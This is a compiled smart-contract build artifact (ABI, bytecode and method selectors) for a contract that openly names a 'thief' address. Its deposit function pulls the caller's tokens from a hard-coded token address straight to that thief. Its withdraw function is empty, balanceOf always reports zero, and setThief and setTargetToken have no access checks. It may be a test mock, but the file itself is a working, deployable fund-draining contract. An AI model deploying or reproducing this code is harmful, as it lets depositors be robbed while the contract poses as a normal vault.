{"abi":[{"type":"constructor","inputs":[],"stateMutability":"nonpayable"},{"type":"function","name":"approve","inputs":[{"name":"","type":"address","internalType":"address"},{"name":"","type":"uint256","internalType":"uint256"}],"outputs":[{"name":"","type":"bool","internalType":"bool"}],"stateMutability":"pure"},{"type":"function","name":"balanceOf","inputs":[{"name":"","type":"address","internalType":"address"}],"outputs":[{"name":"","type":"uint256","internalType":"uint256"}],"stateMutability":"pure"},{"type":"function","name":"decimals","inputs":[],"outputs":[{"name":"","type":"uint8","internalType":"uint8"}],"stateMutability":"pure"},{"type":"function","name":"deposit","inputs":[{"name":"amount","type":"uint256","internalType":"uint256"}],"outputs":[],"stateMutability":"nonpayable"},{"type":"function","name":"getRatio","inputs":[],"outputs":[{"name":"","type":"uint256","internalType":"uint256"}],"stateMutability":"pure"},{"type":"function","name":"setTargetToken","inputs":[{"name":"newTargetToken","type":"address","internalType":"address"}],"outputs":[],"stateMutability":"nonpayable"},{"type":"function","name":"setThief","inputs":[{"name":"newThief","type":"address","internalType":"address"}],"outputs":[],"stateMutability":"nonpayable"},{"type":"function","name":"targetToken","inputs":[],"outputs":[{"name":"","type":"address","internalType":"address"}],"stateMutability":"view"},{"type":"function","name":"thief","inputs":[],"outputs":[{"name":"","type":"address","internalType":"address"}],"stateMutability":"view"},{"type":"function","name":"token","inputs":[],"outputs":[{"name":"","type":"address","internalType":"address"}],"stateMutability":"view"},{"type":"function","name":"transfer","inputs":[{"name":"","type":"address","internalType":"address"},{"name":"","type":"uint256","internalType":"uint256"}],"outputs":[{"name":"","type":"bool","internalType":"bool"}],"stateMutability":"pure"},{"type":"function","name":"transferFrom","inputs":[{"name":"","type":"address","internalType":"address"},{"name":"","type":"address","internalType":"address"},{"name":"","type":"uint256","internalType":"uint256"}],"outputs":[{"name":"","type":"bool","internalType":"bool"}],"stateMutability":"pure"},{"type":"function","name":"withdraw","inputs":[{"name":"","type":"uint256","internalType":"uint256"}],"outputs":[],"stateMutability":"nonpayable"}],"bytecode":{"object":"0x6080604052348015600e575f5ffd5b50736b175474e89094c44da98b954eedeac495271d0f5f5f6101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055503360015f6101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550610936806100af5f395ff3fe608060405234801561000f575f5ffd5b50600436106100cd575f3560e01c8063345135891161008a578063a9059cbb11610064578063a9059cbb1461020f578063b6b55f251461023f578063ec1ebd7a1461025b578063fc0c546a14610279576100cd565b806334513589146101a557806361658637146101c357806370a08231146101df576100cd565b8063095ea7b3146100d15780631b66cb001461010157806323b872dd1461011d5780632e1a7d4d1461014d578063313ce56714610169578063327107f714610187575b5f5ffd5b6100eb60048036038101906100e691906105fb565b610297565b6040516100f89190610653565b60405180910390f35b61011b6004803603810190610116919061066c565b6102a2565b005b61013760048036038101906101329190610697565b6102e4565b6040516101449190610653565b60405180910390f35b610167600480360381019061016291906106e7565b6102f0565b005b6101716102f3565b60405161017e919061072d565b60405180910390f35b61018f6102fb565b60405161019c9190610755565b60405180910390f35b6101ad61031f565b6040516101ba9190610755565b60405180910390f35b6101dd60048036038101906101d8919061066c565b610344565b005b6101f960048036038101906101f4919061066c565b610387565b604051610206919061077d565b60405180910390f35b610229600480360381019061022491906105fb565b610390565b6040516102369190610653565b60405180910390f35b610259600480360381019061025491906106e7565b61039b565b005b610263610534565b604051610270919061077d565b60405180910390f35b610281610543565b60405161028e9190610755565b60405180910390f35b5f6001905092915050565b805f5f6101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555050565b5f600190509392505050565b50565b5f6012905090565b5f5f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b60015f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b8060015f6101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555050565b5f5f9050919050565b5f6001905092915050565b5f810315610531575f5f5f5f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166323b872dd60e01b3360015f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff168660405160240161041a93929190610796565b604051602081830303815290604052907bffffffffffffffffffffffffffffffffffffffffffffffffffffffff19166020820180517bffffffffffffffffffffffffffffffffffffffffffffffffffffffff8381831617835250505050604051610484919061081d565b5f604051808303815f865af19150503d805f81146104bd576040519150601f19603f3d011682016040523d82523d5f602084013e6104c2565b606091505b50915091508180156104ef57505f815114806104ee5750808060200190518101906104ed919061085d565b5b5b61052e576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401610525906108e2565b60405180910390fd5b50505b50565b5f670de0b6b3a7640000905090565b5f5f5f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff16905090565b5f5ffd5b5f73ffffffffffffffffffffffffffffffffffffffff82169050919050565b5f6105978261056e565b9050919050565b6105a78161058d565b81146105b1575f5ffd5b50565b5f813590506105c28161059e565b92915050565b5f819050919050565b6105da816105c8565b81146105e4575f5ffd5b50565b5f813590506105f5816105d1565b92915050565b5f5f604083850312156106115761061061056a565b5b5f61061e858286016105b4565b925050602061062f858286016105e7565b9150509250929050565b5f8115159050919050565b61064d81610639565b82525050565b5f6020820190506106665f830184610644565b92915050565b5f602082840312156106815761068061056a565b5b5f61068e848285016105b4565b91505092915050565b5f5f5f606084860312156106ae576106ad61056a565b5b5f6106bb868287016105b4565b93505060206106cc868287016105b4565b92505060406106dd868287016105e7565b9150509250925092565b5f602082840312156106fc576106fb61056a565b5b5f610709848285016105e7565b91505092915050565b5f60ff82169050919050565b61072781610712565b82525050565b5f6020820190506107405f83018461071e565b92915050565b61074f8161058d565b82525050565b5f6020820190506107685f830184610746565b92915050565b610777816105c8565b82525050565b5f6020820190506107905f83018461076e565b92915050565b5f6060820190506107a95f830186610746565b6107b66020830185610746565b6107c3604083018461076e565b949350505050565b5f81519050919050565b5f81905092915050565b8281835e5f83830152505050565b5f6107f7826107cb565b61080181856107d5565b93506108118185602086016107df565b80840191505092915050565b5f61082882846107ed565b915081905092915050565b61083c81610639565b8114610846575f5ffd5b50565b5f8151905061085781610833565b92915050565b5f602082840312156108725761087161056a565b5b5f61087f84828501610849565b91505092915050565b5f82825260208201905092915050565b7f5452414e534645525f46524f4d5f4641494c45440000000000000000000000005f82015250565b5f6108cc601483610888565b91506108d782610898565b602082019050919050565b5f6020820190508181035f8301526108f9816108c0565b905091905056fea2646970667358221220643391ed7af390d2b57982d3970a69ce970c54f6fd6b281ccfafeac34ee9dc9f64736f6c634300081e0033","linkReferences":{}},"methodIdentifiers":{"approve(address,uint256)":"095ea7b3","balanceOf(address)":"70a08231","decimals()":"313ce567","deposit(uint256)":"b6b55f25","getRatio()":"ec1ebd7a","setTargetToken(address)":"1b66cb00","setThief(address)":"61658637","targetToken()":"327107f7","thief()":"34513589","token()":"fc0c546a","transfer(address,uint256)":"a9059cbb","transferFrom(address,address,uint256)":"23b872dd","withdraw(uint256)":"2e1a7d4d"},"id":0}